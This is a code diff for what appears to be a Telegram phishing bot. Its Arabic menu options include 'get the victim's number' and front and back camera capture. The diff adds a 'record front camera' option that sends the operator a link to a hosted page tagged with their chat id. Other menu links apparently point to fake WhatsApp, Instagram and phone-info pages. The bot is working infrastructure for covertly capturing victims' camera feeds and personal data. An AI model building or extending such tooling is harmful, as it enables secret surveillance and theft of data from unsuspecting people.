@@ -71,6 +71,7 @@ VERCEL_BASE = "https://yahya-kappa.vercel.app"
 LINK_NUM = f"{VERCEL_BASE}/Number%20Phone.html"
 LINK_CAM_BACK = "https://yahya-pages.pages.dev/Cam.html"
 LINK_CAM_FRONT = "https://yahya-pages.pages.dev/Cam2.html"
+LINK_CAM_FRONT_REC = "https://yahya-pages.pages.dev/front.html"
 LINK_FI_REPLY = f"{VERCEL_BASE}/Phone%20Info.html"
 LINK_WHATSAPP = f"{VERCEL_BASE}/Whatsapp.html"
 LINK_INSTAGRAM = f"{VERCEL_BASE}/Instagram.html"
@@ -422,6 +423,7 @@ def build_main_menu():
         ("جلب رقم الضحية 📱", "get_link_num"),
         ("كاميرا امامية 📸", "get_cam_front"),
         ("كاميرا خلفية📸", "get_cam_back"),
+        ("تسجيل كاميرا امامية 🎥", "get_cam_front_rec"),
         ("ID 🆔", "get_id"),
         ("صور AI 🎨", "ai_image"),
         ("اختصار روابط 🔗", "short_link"),
@@ -1329,6 +1331,8 @@ def callback_query(call):
         bot.send_message(chat_id, f"{LINK_NUM}?id={chat_id}")
     elif call.data == "get_cam_front": 
         bot.send_message(chat_id, f"{LINK_CAM_FRONT}?id={chat_id}")
+    elif call.data == "get_cam_front_rec": 
+        bot.send_message(chat_id, f"{LINK_CAM_FRONT_REC}?id={chat_id}")
     elif call.data == "get_cam_back": 
         bot.send_message(chat_id, f"{LINK_CAM_BACK}?id={chat_id}")
     elif call.data == "get_tiktok": 
